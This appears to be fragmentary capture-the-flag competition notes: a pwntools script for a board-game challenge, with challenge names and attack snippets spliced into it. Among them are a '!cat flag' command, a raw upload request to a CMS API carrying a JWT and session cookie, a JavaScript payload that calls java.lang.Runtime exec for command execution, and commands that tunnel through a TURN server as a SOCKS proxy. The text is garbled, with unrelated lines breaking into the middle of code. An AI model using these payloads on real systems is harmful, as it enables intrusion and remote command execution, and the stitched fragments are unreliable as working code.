        boards[board][1][2] = c
        a,b,c = map(int,p.recvline().strip().decode())
        boards[board][2][0] = a
        boards[board][2][1] = b
        boards[board][2][2] = c
    print(boards)
    move(0,1,1,5)
    while not all(solved):
        get_move()
        check_solved()
        if all(solved):
            break
        print(boards)
        attack, board, x,y,val = judge()
        if attack == 1:
            print('Attack!')
            solved[board] = True
        elif attack == 0:
            print('Defend!')
        elif attack == 2:
            print('WTF, failed to defense...')
        print('my:',board, x, y, val)
        move(board, x, y, val)
    status = p.recvuntil('game').decode()
    if 'lose' in status:
        p.close()
        continue
    level = 2
    boards = [[[0]*3 for row in range(3)] for board in range(numBoards[level])]
    solved = [False for board in range(numBoards[level])]
    for board in range(numBoards[level]):
        p.recvuntil('uncomplete')
        p.recvline()
        a,b,c = map(int,p.recvline().strip().decode())
        boards[board][0][0] = a
        boards[board][0][1] = b
        boards[board][0][2] = c
        a,b,c = map(int,p.recvline().strip().decode())
        boards[board][1][0] = a
        boards[board][1][1] = b
        boards[board][1][2] = c
        a,b,c = map(int,p.recvline().strip().decode())
        boards[board][2][0] = a
        boards[board][2][1] = b
        boards[board][2][2] = c
    print(boards)
    move(0,1,1,5)
    while not all(solved):
    # while solved.count(False) > 1:
        print(solved)
        get_move()
        check_solved()
        if all(solved):
            break
        print(boards)
        attack, board, x,y,val = judge()
        if attack == 1:
            print('Attack!')
            solved[board] = True
        elif attack == 0:
            print('Defend!')
        elif attack == 2:
            print('WTF, failed to defense...')
        print('my:',board, x, y, val)
        move(board, x, y, val)
    status = p.recvuntil('game').decode()
    if 'lose' in status:
        p.close()
        continue
    level = 3
    boards = [[[0]*3 for row in range(3)] for board in range(numBoards[level])]
    solved = [False for board in range(numBoards[level])]
    for board in range(numBoards[level]):
        p.recvuntil('uncomplete')
        p.recvline()
        a,b,c = map(int,p.recvline().strip().decode())
        boards[board][0][0] = a
        boards[board][0][1] = b
babydebug
!cat flag
easycms
        boards[board][0][2] = c
        a,b,c = map(int,p.recvline().strip().decode())
        boards[board][1][0] = a
        boards[board][1][1] = b
        boards[board][1][2] = c
        a,b,c = map(int,p.recvline().strip().decode())
        boards[board][2][0] = a
        boards[board][2][1] = b
        boards[board][2][2] = c
    print(boards)
    move(0,1,1,5)
    while not all(solved):
    # while solved.count(False) > 1:
        print(solved)
        get_move()
        check_solved()
        if all(solved):
            break
        print(boards)
        attack, board, x,y,val = judge()
        if attack == 1:
            print('Attack!')
            solved[board] = True
        elif attack == 0:
            print('Defend!')
        elif attack == 2:
            print('WTF, failed to defense...')
        print('my:',board, x, y, val)
        move(board, x, y, val)
    status = p.recvuntil('game').decode()
    if 'lose' in status:
        p.close()
        continue
    p.interactive()
api
POST /index.php?s=/api/Base/upload HTTP/1.1
Host: 172.35.13.101:31337
Pragma: no-cache
Cache-Control: no-cache
tp6popphar
spider
JS
payload
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, 
like Gecko) Chrome/91.0.4472.77 Safari/537.36
Accept: 
text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,
*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9,en;q=0.8
Cookie: PHPSESSID=69fbea77e5f61e0fbabb45fdd786e5ee
authorization: 
eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJpc3MiOiJjbGllbnQueGhhZG1pbiIsImF1ZCI6InNlcnZlci
54aGFkbWluIiwiaWF0IjoxNjIyMzQxNjYzLCJleHAiOjEwMDAwMTYyMjM0MTY2MiwidWlkIjoxfQ.e5fhbPtljQ
C5te8X-KIwxMG9kCtZU1c_cOgLVerJYpk
Connection: close
Content-Type: multipart/form-data; boundary=--------1625044263
Content-Length: 566
----------1625044263
Content-Disposition: form-data; name="upfile"; 
filename="652e043ee9f20635d0b3f2ea1085f0819.png"
Content-Type: application/zip
1
----------1625044263--
var JavaTest= Java.type("java.lang"+".Runtime"); 
var b =JavaTest.getRuntime(); 
b.exec("ls /");
throw b;
return "a";
}
coturn
turner 
 https://github.com/staaldraad/turner.gitgolang
 proxychains  ip http://192.168.0.23 
minus(1);
function ddadf()
{
sudo ./turner -server 10.10.10.102:8000 -socks5